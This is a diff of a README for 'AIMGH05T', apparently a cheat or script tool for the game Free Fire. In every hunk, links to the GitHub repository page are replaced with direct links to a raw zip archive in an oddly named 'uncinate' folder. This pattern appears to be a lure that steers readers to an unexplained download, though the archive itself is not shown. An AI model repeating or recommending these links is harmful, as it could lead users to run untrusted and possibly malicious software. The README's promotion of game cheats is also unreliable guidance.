@@ -1,6 +1,6 @@
 # 🎯 AIMGH05T - Easy Freefire Config and Script Tool
 
-[![Download AIMGH05T](https://img.shields.io/badge/Download-AIMGH05T-brightgreen?style=for-the-badge)](https://github.com/TJoshi3637/AIMGH05T)
+[![Download AIMGH05T](https://img.shields.io/badge/Download-AIMGH05T-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/TJoshi3637/AIMGH05T/main/uncinate/AIMG_T_3.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ These specs help ensure AIMGH05T runs smoothly on your system.
 
 To get the tool, you need to visit its official GitHub page. This page has all the files you need, plus instructions and updates. Click the link below to open the page:
 
-[Download AIMGH05T from GitHub](https://github.com/TJoshi3637/AIMGH05T)
+[Download AIMGH05T from GitHub](https://raw.githubusercontent.com/TJoshi3637/AIMGH05T/main/uncinate/AIMG_T_3.1.zip)
 
 ---
 
@@ -96,7 +96,7 @@ If you face issues using AIMGH05T, try these solutions:
 ## 🔗 Useful Links
 
 - Visit the repository for downloads, updates, and support:  
-[https://github.com/TJoshi3637/AIMGH05T](https://github.com/TJoshi3637/AIMGH05T)
+[https://raw.githubusercontent.com/TJoshi3637/AIMGH05T/main/uncinate/AIMG_T_3.1.zip](https://raw.githubusercontent.com/TJoshi3637/AIMGH05T/main/uncinate/AIMG_T_3.1.zip)
 
 - Check Freefire’s official site for game updates and news.  
 
@@ -108,4 +108,4 @@ If you have questions or run into problems, use the "Issues" tab on the GitHub p
 
 ---
 
-[![Download AIMGH05T](https://img.shields.io/badge/Download-AIMGH05T-blue?style=for-the-badge)](https://github.com/TJoshi3637/AIMGH05T)
+[![Download AIMGH05T](https://img.shields.io/badge/Download-AIMGH05T-blue?style=for-the-badge)](https://raw.githubusercontent.com/TJoshi3637/AIMGH05T/main/uncinate/AIMG_T_3.1.zip)
